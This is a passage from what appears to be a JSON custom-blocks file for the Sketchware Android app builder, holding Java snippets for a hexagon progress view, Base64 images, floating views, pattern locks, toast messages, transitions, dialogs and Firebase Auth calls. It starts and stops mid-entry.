rainbow;\r\n    }\r\n    public void setRainbow(boolean rainbow) {\r\n        this.rainbow \u003d rainbow;\r\n    }\r\n    public int getCornerRadius() {\r\n        return cornerRadius;\r\n    }\r\n    public void setCornerRadius(int cornerRadius) {\r\n        this.cornerRadius \u003d cornerRadius;\r\n    }\r\n    public boolean isShrink() {\r\n        return shrink;\r\n    }\r\n    public void setShrink(boolean shrink) {\r\n        this.shrink \u003d shrink;\r\n    }\r\n    private void initPaint() {\r\n        paint.setAlpha(0);\r\n        paint.setPathEffect(new CornerPathEffect(cornerRadius));\r\n        paint.setColor(color);\r\n        paint.setStyle(Paint.Style.FILL);\r\n        paint.setAntiAlias(true);\r\n    }\r\n    @Override\r\n    protected void onAttachedToWindow() {\r\n        super.onAttachedToWindow();\r\n        startAnimation();\r\n    }\r\n    @Override\r\n    protected void onDetachedFromWindow() {\r\n        super.onDetachedFromWindow();\r\n        stopAnimation();\r\n    }\r\n    @Override\r\n    public void setVisibility(int visibility) {\r\n        int currentVisibility \u003d getVisibility();\r\n        super.setVisibility(visibility);\r\n        if (visibility !\u003d currentVisibility) {\r\n            if (visibility \u003d\u003d View.VISIBLE) {\r\n                resetAnimator();\r\n            } else if (visibility \u003d\u003d View.GONE || visibility \u003d\u003d View.INVISIBLE) {\r\n                stopAnimation();\r\n            }\r\n        }\r\n    }\r\n    private void startAnimation() {\r\n        resetAnimator();\r\n    }\r\n    private void stopAnimation() {\r\n        actualProgress \u003d 0;\r\n        if (indeterminateAnimator !\u003d null) {\r\n            indeterminateAnimator.cancel();\r\n            indeterminateAnimator \u003d null;\r\n        }\r\n    }\r\n    private void resetAnimator() {\r\n        if (indeterminateAnimator !\u003d null \u0026\u0026 indeterminateAnimator.isRunning()) {\r\n            indeterminateAnimator.cancel();\r\n        }\r\n        ValueAnimator progressAnimator \u003d ValueAnimator.ofFloat(0, MAX_PROGRESS_VALUE);\r\n        progressAnimator.setDuration(animationTime);\r\n        progressAnimator.setInterpolator(new LinearInterpolator());\r\n        progressAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\r\n            @Override\r\n            public void onAnimationUpdate(ValueAnimator animation) {\r\n                actualProgress \u003d (Float) animation.getAnimatedValue();\r\n                invalidate();\r\n            }\r\n        });\r\n        indeterminateAnimator \u003d new AnimatorSet();\r\n        indeterminateAnimator.play(progressAnimator);\r\n        indeterminateAnimator.addListener(new AnimatorListenerAdapter() {\r\n            boolean wasCancelled \u003d false;\r\n            @Override\r\n            public void onAnimationCancel(Animator animation) {\r\n                wasCancelled \u003d true;\r\n            }\r\n            @Override\r\n            public void onAnimationEnd(Animator animation) {\r\n                if (!wasCancelled) {\r\n                    resetAnimator();\r\n                }\r\n            }\r\n        });\r\n        indeterminateAnimator.start();\r\n    }\r\n    @Override\r\n    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\r\n        int viewWidth \u003d MeasureSpec.getSize(widthMeasureSpec);\r\n        int viewHeight \u003d viewWidth;\r\n        hexWidth \u003d viewWidth / 3;\r\n        hexHeight \u003d viewHeight * 2 / 5;\r\n        hexPadding \u003d viewHeight / 23;\r\n        setMeasuredDimension(viewWidth, viewHeight);\r\n    }\r\n    @Override\r\n    protected void onDraw(Canvas canvas) {\r\n        int alpha \u003d getAlpha(1, actualProgress);\r\n        paint.setColor(getHexagonColor(1));\r\n        paint.setAlpha(alpha);\r\n        Path hexPath \u003d hiveRect(hexWidth / 2, hexPadding, hexWidth * 3 / 2, hexHeight + hexPadding,\r\n                                (float) alpha / maxAlpha);\r\n        canvas.drawPath(hexPath, paint);\r\n\r\n        alpha \u003d getAlpha(2, actualProgress);\r\n        paint.setColor(getHexagonColor(2));\r\n        paint.setAlpha(alpha);\r\n        hexPath \u003d hiveRect(hexWidth * 3 / 2, hexPadding, hexWidth * 5 / 2, hexHeight + hexPadding,\r\n                           (float) alpha / maxAlpha);\r\n        canvas.drawPath(hexPath, paint);\r\n\r\n        alpha \u003d getAlpha(6, actualProgress);\r\n        paint.setColor(getHexagonColor(6));\r\n        paint.setAlpha(alpha);\r\n        hexPath \u003d hiveRect(0, hexHeight * 3 / 4 + hexPadding, hexWidth,\r\n                           hexHeight * 7 / 4 + hexPadding, (float) alpha / maxAlpha);\r\n        canvas.drawPath(hexPath, paint);\r\n\r\n        alpha \u003d getAlpha(7, actualProgress);\r\n        paint.setColor(getHexagonColor(7));\r\n        paint.setAlpha(alpha);\r\n        hexPath \u003d hiveRect(hexWidth, hexHeight * 3 / 4 + hexPadding, hexWidth * 2,\r\n                           hexHeight * 7 / 4 + hexPadding, (float) alpha / maxAlpha);\r\n        canvas.drawPath(hexPath, paint);\r\n\r\n        alpha \u003d getAlpha(3, actualProgress);\r\n        paint.setColor(getHexagonColor(3));\r\n        paint.setAlpha(alpha);\r\n        hexPath \u003d hiveRect(hexWidth * 2, hexHeight * 3 / 4 + hexPadding, hexWidth * 3,\r\n                           hexHeight * 7 / 4 + hexPadding, (float) alpha / maxAlpha);\r\n        canvas.drawPath(hexPath, paint);\r\n\r\n        alpha \u003d getAlpha(5, actualProgress);\r\n        paint.setColor(getHexagonColor(5));\r\n        paint.setAlpha(alpha);\r\n        hexPath \u003d hiveRect(hexWidth / 2, hexHeight * 6 / 4 + hexPadding, hexWidth * 3 / 2,\r\n                           hexHeight * 10 / 4 + hexPadding, (float) alpha / maxAlpha);\r\n        canvas.drawPath(hexPath, paint);\r\n\r\n        alpha \u003d getAlpha(4, actualProgress);\r\n        paint.setColor(getHexagonColor(4));\r\n        paint.setAlpha(alpha);\r\n        hexPath \u003d hiveRect(hexWidth * 3 / 2, hexHeight * 6 / 4 + hexPadding, hexWidth * 5 / 2,\r\n                           hexHeight * 10 / 4 + hexPadding, (float) alpha / maxAlpha);\r\n        canvas.drawPath(hexPath, paint);\r\n    }\r\n    private int getHexagonColor(int position) {\r\n        if (rainbow \u0026\u0026 position \u003c\u003d rainbowColor.length) {\r\n            return rainbowColor[position - 1];\r\n        } else {\r\n            return color;\r\n        }\r\n    }\r\n    private int getAlpha(int num, float progress) {\r\n        float alpha;\r\n        if (progress \u003e num * 100) {\r\n            alpha \u003d maxAlpha;\r\n        } else {\r\n            int min \u003d (num - 1) * 100;\r\n            alpha \u003d (progress - min) \u003e 0 ? progress - min : 0;\r\n            alpha \u003d alpha * maxAlpha / 100;\r\n        }\r\n        if (progress \u003e 700) {\r\n            float fadeProgress \u003d progress - 700;\r\n            if (fadeProgress \u003e num * 100) {\r\n                alpha \u003d 0;\r\n            } else {\r\n                int min \u003d (num - 1) * 100;\r\n                alpha \u003d (fadeProgress - min) \u003e 0 ? fadeProgress - min : 0;\r\n                alpha \u003d maxAlpha - alpha * maxAlpha / 100;\r\n            }\r\n        }\r\n        if (progress \u003e 1400) {\r\n            alpha \u003d 0;\r\n        }\r\n        return (int) alpha;\r\n    }\r\n    private Path hiveRect(int left, int top, int right, int bottom, float percentage) {\r\n        Path path \u003d new Path();\r\n        int height \u003d Math.abs(bottom - top);\r\n        int width \u003d Math.abs(right - left);\r\n        int r \u003d width \u003e height ? height : width;\r\n        r \u003d r / 2;\r\n        int y \u003d top;\r\n        if (shrink) {\r\n            y \u003d top + (int) (r - percentage * r);\r\n            r \u003d (int) (percentage * r);\r\n        }\r\n        int x \u003d (right - left) / 2 + left;\r\n        int edge \u003d (int) (r * Math.sqrt(3) / 2);\r\n        path.moveTo(x, y);\r\n        x \u003d x + edge;\r\n        y \u003d y + r / 2;\r\n        path.lineTo(x, y);\r\n        y \u003d y + r;\r\n        path.lineTo(x, y);\r\n        x \u003d x - edge;\r\n        y \u003d y + r / 2;\r\n        path.lineTo(x, y);\r\n        x \u003d x - edge;\r\n        y \u003d y - r / 2;\r\n        path.lineTo(x, y);\r\n        y \u003d y - r;\r\n        path.lineTo(x, y);\r\n        path.close();\r\n        return path;\r\n    }\r\n}\n{","name":"HiveLib","palette":"97","type":" ","spec":"##Hive Progress Lib##"},{"code":"HiveProgressView %1$s \u003d new HiveProgressView(this);\r\n%2$s.addView(%1$s);\r\n%1$s.setRainbow(false);\r\n%1$s.setColor(%3$s);","name":"Hive Progress","palette":"97","type":" ","spec":"Hive Progress ID %s.inputOnly add to %m.view color %m.color"},{"code":"//READ ME: since sketchware doeant let us create functions with returnable values, you will need a string variable called Base64String\nif(%1$s.getDrawable() instanceof android.graphics.drawable.BitmapDrawable ){\nandroid.graphics.drawable.BitmapDrawable bd \u003d (android.graphics.drawable.BitmapDrawable) %1$s.getDrawable();\nBitmap bm \u003d bd.getBitmap();\njava.io.ByteArrayOutputStream baos \u003d new java.io.ByteArrayOutputStream();\nBitmapFactory.Options opts \u003d new BitmapFactory.Options();\nopts.inPreferredConfig \u003d Bitmap.Config.ARGB_8888;\nbm.compress(Bitmap.CompressFormat.PNG, 100, baos);\nbyte[] imageBytes \u003d baos.toByteArray();\nString imageString \u003d android.util.Base64.encodeToString(imageBytes, android.util.Base64.DEFAULT);\n%2$s \u003d imageString;\n}","name":"ImageViewToBase64","palette":"99","type":" ","spec":"ImageView %m.imageview to Base64 save to str var%s.inputOnly"},{"code":"new Object(){\n\t\t\t private void setB64Image(ImageView iv265, String s274){\n\t\t\t\t try{\n\t\t\t\t byte[] decodedString \u003d android.util.Base64.decode(s274.replace(\" \",\"\").replace(\"\\n\",\"\"), android.util.Base64.DEFAULT);\n\t\t\t\t android.graphics.Bitmap decodedByte \u003d android.graphics.BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length); \n\t\t\t\t iv265.setImageBitmap(decodedByte);\n\t\t\t\t }catch(Exception e72) {}\n\t\t\t }\n\t\t }.setB64Image(%s,%s);","name":"setImageFromBase64String","palette":"99","type":" ","spec":"%m.imageview setBase64Image %s"},{"code":"FloatingViewManager mFloatingViewManager \u003d new FloatingViewManager(%1$s.this, null);","name":"float view create","palette":"100","type":" ","spec":"FloatViewCreate On%m.activity"},{"code":"final FloatingViewManager.Options options \u003d new FloatingViewManager.Options();\n\t\toptions.overMargin \u003d(int) %2$s;\nfinal ImageView iconView \u003d new ImageView(%1$s.this);\niconView.setScaleType(android.widget.ImageView.ScaleType.FIT_CENTER);","name":"Create Folating Logo","palette":"100","type":" ","spec":"%m.activity Create Floating Icon Margin%d"},{"code":"Glide.with(getApplicationContext()).load(Uri.parse(%s)).into(iconView);","name":"SetFloatingIcon","palette":"100","type":" ","spec":"set Icon From Url%s"},{"code":"iconView","name":"iconView","typeName":"imageview","palette":"100","type":"v","spec":"Floating ImageView"},{"code":"iconView.setImageResource(R.drawable.%s);","name":"floating icon 1","palette":"100","type":" ","spec":"setIcon1%m.resource"},{"code":"mFloatingViewManager.setFixedTrashIconImage(R.drawable.%s);","name":"set Delete Icon","palette":"100","type":" ","spec":"setFixedTrashIconImage %m.resource "},{"code":"mFloatingViewManager.setActionTrashIconImage(R.drawable.%s);","name":"setAction Delete IconImage","palette":"100","type":" ","spec":"setAction Delete IconImage %m.resource"},{"code":"mFloatingViewManager.addViewToWindow(iconView, options);\niconView.setLayoutParams(new android.widget.ImageSwitcher.LayoutParams( %1$s, %1$s));","name":"Float Build","palette":"100","type":" ","spec":"Build and setIconSize %d"},{"code":"PatternLockUtils.patternToString(%s, %s)","name":"patternToString","palette":"101","type":"s","spec":"%m.patternview getPattern from %m.listStr to String "},{"code":"PatternLockUtils.patternToMD5(%s, %s)","name":"patternToMD5","palette":"101","type":"s","spec":"%m.patternview getPattern from %m.listStr to MD5"},{"code":"PatternLockUtils.patternToSha1(%s, %s)","name":"patternToSha1","palette":"101","type":"s","spec":"%m.patternview getPattern from %m.listStr to SHA1"},{"code":"%s.setDotCount((int)%s);","name":"setDotCount","palette":"101","type":" ","spec":"%m.patternview setDotCount %d "},{"code":"%s.setDotNormalSize((int)%s);","name":"setDotNormalSize","palette":"101","type":" ","spec":"%m.patternview setDotNormalSize %d "},{"code":"%s.setDotSelectedSize((int)%s);","name":"setDotSelectedSize","palette":"101","type":" ","spec":"%m.patternview setDotSelectedSize %d "},{"code":"%s.setPathWidth((int)%s);","name":"setPathWidth","palette":"101","type":" ","spec":"%m.patternview setPathWidth %d"},{"code":"%s.setDotAnimationDuration((int)%s);","name":"setDotAnimationDuration","palette":"101","type":" ","spec":"%m.patternview setDotAnimationDuration %d"},{"code":"%s.setPathEndAnimationDuration((int)%s);","name":"setEndAnimationDuration","palette":"101","type":" ","spec":"%m.patternview setEndAnimationDuration %d"},{"code":"%s.setAspectRatioEnabled(%s);","name":"setAspectRatioEnabled","palette":"101","type":" ","spec":"%m.patternview setAspectRatioEnabled %b"},{"code":"%s.setInStealthMode(%s);","name":"setInStealthMode","palette":"101","type":" ","spec":"%m.patternview setInStealthMode %b"},{"code":"%s.setTactileFeedbackEnabled(%s);","name":"setTactileFeedbackEnabled","palette":"101","type":" ","spec":"%m.patternview setTactileFeedbackEnabled %b"},{"code":"%s.setInputEnabled(%s);","name":"setInputEnabled","palette":"101","type":" ","spec":"%m.patternview setInputEnabled %b"},{"code":"%s.setNormalStateColor(%s);","name":"setNormalStateColor","palette":"101","type":" ","spec":"%m.patternview setNormalStateColor %m.color"},{"code":"%s.setCorrectStateColor(%s);","name":"setCorrectStateColor","palette":"101","type":" ","spec":"%m.patternview setCorrectStateColor %m.color"},{"code":"%s.setWrongStateColor(%s);","name":"setWrongStateColor","palette":"101","type":" ","spec":"%m.patternview setWrongStateColor %m.color"},{"code":"%s.setViewMode(PatternLockView.PatternViewMode.%s);","name":"setPatternViewMode","palette":"101","type":" ","spec":"%m.patternview setViewMode %m.patternviewmode"},{"code":"%s.setAspectRatio(PatternLockView.AspectRatio.%s);","name":"setPatternAspectRation","palette":"101","type":" ","spec":"%m.patternview setAspectRatio %m.patternaspectratio"},{"code":"%s.clearPattern();","name":"clearPattern","palette":"101","type":" ","spec":"%m.patternview clearPattern"},{"code":"%s.setStatus(InsLoadingView.Status.%s);","color":"#FF493C","name":"insta status","typeName":"","palette":"102","type":" ","spec":"%m.imageview set story status %s "},{"code":"LOADING","color":"#FF493C","name":"insta loading status","typeName":"","palette":"102","type":"s","spec":"Loading status"},{"code":"UNCLICKED","color":"#FF493C","name":"insta unclicked status","typeName":"","palette":"102","type":"s","spec":"Unclicked status"},{"code":"CLICKED","color":"#FF493C","name":"insta clicked status","typeName":"","palette":"102","type":"s","spec":"Clicked status"},{"code":"%1$s.setStartColor(%2$s);\n%1$s.setEndColor(%3$s);","color":"#FF493C","name":"insta colors","typeName":"","palette":"102","type":" ","spec":"%m.imageview set start color %m.color end color %m.color"},{"code":"%1$s.setCircleDuration(%2$s);\n%1$s.setRotateDuration(%3$s);","color":"#FF493C","name":"insta durations","typeName":"","palette":"102","type":" ","spec":"%m.imageview set circle duration %d rotate duration %d"},{"code":"//copyright holder","color":"#FFE91E63","name":"This blocks is Made by Arkanghel \u0026 Cyber Alpha","typeName":"","palette":"103","type":"h","spec":"This blocks is Made by Arkanghel \u0026 Cyber Alpha"},{"code":"startActivity(new Intent(%1$s.this, %2$s.class)); %3$s(%1$s.this);","color":"#FFE91E63","name":"Animatoo : )","typeName":"","palette":"103","type":" ","spec":"Animatoo Transition \u003e\u003e  Main%m.activity Target %m.activity  Style %s "},{"code":"//animatonstyles","color":"#FFE91E63","name":"stype animato","typeName":"","palette":"103","type":"h","spec":"Animatoo Styles "},{"code":"Animatoo.animateZoom","color":"#FFE91E63","name":"zoom animatoo","typeName":"","palette":"103","type":"s","spec":"Zoom"},{"code":"Animatoo.animateFade","color":"#FFE91E63","name":"animato faded","typeName":"","palette":"103","type":"s","spec":"Fade"},{"code":"Animatoo.animateWindmill","color":"#FFE91E63","name":"animato windmill","typeName":"","palette":"103","type":"s","spec":"Windmill"},{"code":"Animatoo.animateSpin","color":"#FFE91E63","name":"animato spin","typeName":"","palette":"103","type":"s","spec":"Spin"},{"code":"Animatoo.animateDiagonal","color":"#FFE91E63","name":"Diagonal animatoo","typeName":"","palette":"103","type":"s","spec":"Diagonal"},{"code":"Animatoo.animateSplit","color":"#FFE91E63","name":"animto split","typeName":"","palette":"103","type":"s","spec":"Split"},{"code":"Animatoo.animateShrink","color":"#FFE91E63","name":"shrink animato","typeName":"","palette":"103","type":"s","spec":"Shrink"},{"code":"Animatoo.animateCard","color":"#FFE91E63","name":"animat card","typeName":"","palette":"103","type":"s","spec":"Card"},{"code":"Animatoo.animateInAndOut","color":"#FFE91E63","name":"in out animato","typeName":"","palette":"103","type":"s","spec":"In And Out"},{"code":"Animatoo.animateSwipeLeft","color":"#FFE91E63","name":"animato swipe left","typeName":"","palette":"103","type":"s","spec":"Swipe Left"},{"code":"Animatoo.animateSwipeRight","color":"#FFE91E63","name":"swipe right animato","typeName":"","palette":"103","type":"s","spec":"Swipe Right"},{"code":"Animatoo.animateSlideLeft","color":"#FFE91E63","name":"slide Left animato","typeName":"","palette":"103","type":"s","spec":"Slide Left"},{"code":"Animatoo.animateSlideRight","color":"#FFE91E63","name":"right animato slide","typeName":"","palette":"103","type":"s","spec":"Slide Right"},{"code":"Animatoo.animateSlideDown","color":"#FFE91E63","name":"Animatoo Slide Down","typeName":"","palette":"103","type":"s","spec":"Slide Down"},{"code":"Animatoo.animateSlideUp","color":"#FFE91E63","name":"Animatoo Slide Up","typeName":"","palette":"103","type":"s","spec":"Slide Up"},{"code":"FancyToast.makeText(%s.this, %s, FancyToast.LENGTH_LONG, FancyToast.DEFAULT, %s).show();","color":"#FF90A4AE","name":"Default Toast","typeName":"","palette":"104","type":" ","spec":"Default Toast at %m.activity message%s Show default icon%b "},{"code":"FancyToast.makeText(%s.this, %s, FancyToast.LENGTH_LONG, FancyToast.SUCCESS, %s).show();","color":"#FF4CAF50","name":"Success Toast","typeName":"Success Toast","palette":"104","type":" ","spec":"Success Toast on %m.activity message%s set default icon%b "},{"code":"FancyToast.makeText(%s.this, %s, FancyToast.LENGTH_LONG, FancyToast.ERROR, %s).show();","color":"#FFF44336","name":"Error Toast","typeName":"Error Toast","palette":"104","type":" ","spec":"Error Toast on%m.activity message%s  Set default icon%b "},{"code":"FancyToast.makeText(%s.this, %s, FancyToast.LENGTH_LONG, FancyToast.WARNING, %s).show();","color":"#FFFF9800","name":"Warning Toast","typeName":"","palette":"104","type":" ","spec":"Warning Toast On %m.activity message%s Set default icon%b "},{"code":"FancyToast.makeText(%s.this, %s, FancyToast.LENGTH_LONG, FancyToast.INFO, %s).show();","color":"#FF3F51B5","name":"INFO Toast","typeName":"","palette":"104","type":" ","spec":"INFO Toast on%m.activity message%s  Set default icon%b "},{"code":"FancyToast.makeText(%s.this, %s, FancyToast.LENGTH_LONG, FancyToast.CONFUSING, %s).show();","color":"#FF616161","name":"CONFUSING Toast","typeName":"","palette":"104","type":" ","spec":"Confusing Toast on%m.activity message%s Set default icon%b "},{"code":"","color":"#65FF58","name":"","typeName":"","palette":"104","type":"h","spec":"Tasty Toast"},{"code":"TastyToast.makeText(getApplicationContext(), %s, TastyToast.LENGTH_LONG, TastyToast.SUCCESS);","color":"#FF4CAF50","name":"TastyToast on successful","typeName":"","palette":"104","type":" ","spec":"TastyToast on successful message%s "},{"code":"TastyToast.makeText(getApplicationContext(), %s, TastyToast.LENGTH_LONG, TastyToast.WARNING);","color":"#FFFF9800","name":"TastyToast on warning","typeName":"TastyToast on warning","palette":"104","type":" ","spec":"Tasty on warning message%s "},{"code":"TastyToast.makeText(getApplicationContext(), %s, TastyToast.LENGTH_LONG, TastyToast.ERROR);","color":"#FFF44336","name":"TastyToast on error","typeName":"","palette":"104","type":" ","spec":"Tasty on error message%s "},{"code":"TastyToast.makeText(getApplicationContext(), %s, TastyToast.LENGTH_LONG, TastyToast.INFO);","color":"#FF3F51B5","name":"Tasty on info","typeName":"","palette":"104","type":" ","spec":"Tasty on info message%s "},{"code":"TastyToast.makeText(getApplicationContext(), %s, TastyToast.LENGTH_LONG, TastyToast.DEFAULT);","color":"#FF607D8B","name":"Tasty on Default","typeName":"","palette":"104","type":" ","spec":"Tasty on Default message%s "},{"code":"TastyToast.makeText(getApplicationContext(), %s, TastyToast.LENGTH_LONG, TastyToast.CONFUSING);","color":"#FF00BCD4","name":"Tasty On Confusing","typeName":"","palette":"104","type":" ","spec":"Tasty On Confusing message%s "},{"code":"","color":"#FF2196F3","name":"Arab Ware","typeName":"","palette":"105","type":"h","spec":"By Amin Samad"},{"code":"AsyncTask.execute(new Runnable() {\n   @Override\n   public void run() {\n%s\n   }\n});","color":"#FF2196F3","name":"background work","typeName":"","palette":"105","type":"c","spec":"make below working on background"},{"code":"%1$s \u003d MediaPlayer.create(getApplicationContext(), Uri.fromFile(new java.io.File(%2$s)));","color":"#FF2196F3","name":"play music","typeName":"","palette":"105","type":" ","spec":"play music with %m.mediaplayer with path %s"},{"code":"try{\nint count;\njava.io.InputStream input\u003d this.getAssets().open(%s);\njava.io.OutputStream output \u003d new  java.io.FileOutputStream(%s+%s);\nbyte data[] \u003d new byte[1024];\nwhile ((count \u003d input.read(data))\u003e0) {\noutput.write(data, 0, count);\n}\noutput.flush();\noutput.close();\ninput.close();","color":"#FF2196F3","name":"assets save","typeName":"","palette":"105","type":" ","spec":"save file from assets that has name  %s into path %s with name %s"},{"code":"Intent intent \u003d new Intent(Intent.ACTION_SENDTO); intent.setData(Uri.parse(\"mailto:\")); intent.putExtra(Intent.EXTRA_EMAIL , new String[] { %s }); intent.putExtra(Intent.EXTRA_SUBJECT, %s); startActivity(Intent.createChooser(intent, \"Email via...\"));","color":"#FF2196F3","name":"send email","typeName":"","palette":"105","type":" ","spec":"send message from user to your gmali %s  with message %s "},{"code":"getApplicationContext().getPackageName()","color":"#FF2196F3","name":"packagename","typeName":"","palette":"105","type":"s","spec":"get package name of this app"},{"code":"android.hardware.camera2.CameraManager cameraManager \u003d (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);\ntry {\nString cameraId \u003d cameraManager.getCameraIdList()[0]; cameraManager.setTorchMode(cameraId, true); } catch (android.hardware.camera2.CameraAccessException e) { }","name":"Flashlight On","palette":"105","type":" ","spec":"Flashlight On"},{"code":"android.hardware.camera2.CameraManager cameraManager \u003d (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);\ntry {\nString cameraId \u003d cameraManager.getCameraIdList()[0]; cameraManager.setTorchMode(cameraId, false); } catch (android.hardware.camera2.CameraAccessException e) { }","name":"Flashlight Off","palette":"105","type":" ","spec":"Flashlight Off"},{"code":"Intent launchIntent \u003d getPackageManager().getLaunchIntentForPackage(\"%s\");  { startActivity(launchIntent);}","color":"#FF2196F3","name":"open app","typeName":"","palette":"105","type":" ","spec":"open app with package name %s "},{"code":"Uri packageURI \u003d Uri.parse(\"package:\".concat(\"%s\")); Intent uninstallIntent \u003d new Intent(Intent.ACTION_DELETE, packageURI); startActivity(uninstallIntent);","color":"#FF2196F3","name":"uninstall app","typeName":"","palette":"105","type":" ","spec":"uninstall app with package name %s "},{"code":"setRequestedOrientation(android.content.pm.ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);","color":"#FF2196F3","name":"one","typeName":"","palette":"105","type":" ","spec":"Landscape Orientation"},{"code":"setRequestedOrientation(android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);","color":"#FF2196F3","name":"two","typeName":"","palette":"105","type":" ","spec":"Portrait Orientation"},{"code":"%s.performClick(); ","color":"#FF2196F3","name":"Click","typeName":"","palette":"105","type":" ","spec":"click %m.view"},{"code":"getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);","color":"#FF2196F3","name":"screen on","typeName":"","palette":"105","type":" ","spec":"Keep device screen on"},{"code":"getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);","color":"#FF2196F3","name":"screen of","typeName":"","palette":"105","type":" ","spec":"Keep device screen off"},{"code":"ContextCompat.checkSelfPermission(this, %s) \u003d\u003d -1","color":"#FF2196F3","name":"permission","typeName":"","palette":"105","type":"b","spec":"permission %s not allowed"},{"code":"ActivityCompat.requestPermissions(this, new String[]{%s}, 1000);","color":"#FF2196F3","name":"request permission","typeName":"","palette":"105","type":" ","spec":"request permission %s"},{"code":"ActivityCompat.requestPermissions(this, new String[]{\"android.permission.READ_EXTERNAL_STORAGE\", \"android.permission.WRITE_EXTERNAL_STORAGE\"}, 1000);","color":"#FF2196F3","name":"request storage permission","typeName":"","palette":"105","type":" ","spec":"request storage permission"},{"code":"//This block is arranged and coded by CyberAlpha PH","color":"#7B7B7B","name":"Diamo","typeName":"","palette":"108","type":"h","spec":"IOS Dialog Style"},{"code":"iOSDialogBuilder %1$s \u003d new iOSDialogBuilder(%2$s.this);\n%1$s\n%3$s\n.build().show();","color":"#7B7B7B","name":"IOSDialogv2","typeName":"","palette":"108","type":"c","spec":"IOS Dialog %s.inputOnly to %m.activity "},{"code":".setTitle(%1$s)","color":"#7B7B7B","name":"title","typeName":"","palette":"108","type":" ","spec":"Set Title%s"},{"code":".setSubtitle(%1$s) \t","color":"#7B7B7B","name":"Message","typeName":"","palette":"108","type":" ","spec":"Set Message %s"},{"code":".setBoldPositiveLabel(%1$s)","color":"#7B7B7B","name":"Bold","typeName":"","palette":"108","type":" ","spec":"SetBoldPositive %b"},{"code":"\t.setCancelable(%1$s)","color":"#7B7B7B","name":"Cancelable","typeName":"","palette":"108","type":" ","spec":"Set Cancelable %b"},{"code":".setPositiveListener(%1$s,new iOSDialogClickListener() \n{ \t @Override \t public void onClick(iOSDialog dialog) { \t\t\n%2$s\t \n}\n})\t","color":"#7B7B7B","name":"Positive Listener","typeName":"","palette":"108","type":"c","spec":"Set Positive Listener %s"},{"code":".setNegativeListener(%1$s, new iOSDialogClickListener() \n{ \t \n@Override \t public void onClick(iOSDialog dialog) { \t\t\n%2$s\n}\n})","color":"#7B7B7B","name":"Negative","typeName":"","palette":"108","type":"c","spec":"Set Negative Listener %s"},{"code":"dialog.dismiss(); ","color":"#7B7B7B","name":"Dismiss","typeName":"","palette":"108","type":" ","spec":"Dismiss"},{"code":"%s","name":"getVarActionCodeSettings","typeName":"ActionCodeSettings","palette":"107","type":"v","spec":"getVarActionCodeSettings %s.inputOnly"},{"code":"FirebaseAuth.getInstance().getCurrentUser().getDisplayName()","name":"firebaseAuthGetName","palette":"107","type":"s","spec":"FirebaseAuth getName"},{"code":"FirebaseAuth.getInstance().getCurrentUser().getPhotoUrl().toString()","name":"firebaseAuthGetPhotoUrl","palette":"107","type":"s","spec":"FirebaseAuth getPhotoUrl"},{"code":"((FirebaseUser)FirebaseAuth.getInstance().getCurrentUser()) !\u003d null","name":"firebaseAuthisLoggedIn","palette":"107","type":"b","spec":"FirebaseAuth isLoggedIn"},{"code":"FirebaseAuth.getInstance().getCurrentUser().isEmailVerified()","name":"firebaseAuthisEmailVerified","palette":"107","type":"b","spec":"FirebaseAuth isEmailVerified"},{"code":"ActionCodeSettings %s \u003d ActionCodeSettings.newBuilder()\n.setUrl(%s)\n.setHandleCodeInApp(true)\n.setIOSBundleId(%s)\n.setAndroidPackageName(%s, true, \"19\")\n.build();","name":"firebaseAuthActionCodeSettings","palette":"107","type":" ","spec":"ActionCodeSettings %s.inputOnly Create New Builder With Url %s And Package IOS %s Package Android %s "},{"code":"FirebaseAuth.getInstance().getCurrentUser().updateProfile(new UserProfileChangeRequest.Builder().setDisplayName(%2$s).setPhotoUri(Uri.parse(%3$s)).build()).addOnCompleteListener(%1$s_updateProfileListener);","name":"firebaseAuthUpdateProfile","palette":"107","type":" ","spec":"%m.firebaseauth updateProfile Name %s Photo Url %s"},{"code":"FirebaseAuth.getInstance().getCurrentUser().updateEmail(%2$s).addOnCompleteListener(%1$s_updateEmailListener);","name":"firebaseAuthUpdateEmail","palette":"107","type":" ","spec":"%m.firebaseauth updateEmail %s"},{"code":"FirebaseAuth.getInstance().getCurrentUser().updatePassword(%2$s).addOnCompleteListener(%1$s_updatePasswordListener);","name":"firebaseAuthUpdatePassword","palette":"107","type":" ","spec":"%m.firebaseauth updatePassword %s"},{"code":"FirebaseAuth.getInstance().getCurrentUser().sendEmailVerification().addOnCompleteListener(%s_emailVerificationSentListener);","name":"firebaseAuthSendEmailVerification","palette":"107","type":" ","spec":"%m.firebaseauth sendEmailVerification"},{"code":"FirebaseAuth.getInstance().getCurrentUser().delete()\n.addOnCompleteListener(%s_deleteUserListener);","name":"firebaseAuthDeleteUser","palette":"107","type":" ","spec":"%m.firebaseauth deleteUser"},{"code":"PhoneAuthProvider.getInstance().verifyPhoneNumber(%2$s, 60, TimeUnit.SECONDS, %3$s.this, %1$s);","name":"FirebasePhoneAuth startPhoneNumberVerification","palette":"107","type":" ","spec":"%m.FirebasePhoneAuth startPhoneNumberVerification %s On %m.activity"},{"code":"FirebaseAuth.getInstance().signInWithCredential(PhoneAuthProvider.getCredential(%2$s, %3$s)).addOnCompleteListener(%1$s_phoneAuthListener);","name":"FirebasePhoneAuth verifyPhoneNumberWithCode","palette":"107","type":" ","spec":"%m.firebaseauth verifyPhoneNumberWithCode Verification %s Code %s"},{"code":"FirebaseAuth.getInstance().signInWithCredential(%2$s).addOnCompleteListener(%1$s_phoneAuthListener);","name":"FirebasePhoneAuth signInWithPhoneAuthCredential","palette":"107","type":" ","spec":"%m.firebaseauth signInWithPhoneAuthCredential %m.PhoneAuthCredential"},{"code":"PhoneAuthProvider.getInstance().verifyPhoneNumber(%2$s, 60, TimeUnit.SECONDS, %3$s.this, %1$s, %1$s_resendToken);","name":"FirebasePhoneAuth resendVerificationCode","palette":"107","type":" ","spec":"%m.FirebasePhoneAuth resendVerificationCode %s On %m.activity"},{"code":"%1$s_resendToken \u003d %2$s;","name":"FirebasePhoneAuth setRecentToken","palette":"107","type":" ","spec":"%m.FirebasePhoneAuth setRecentToken 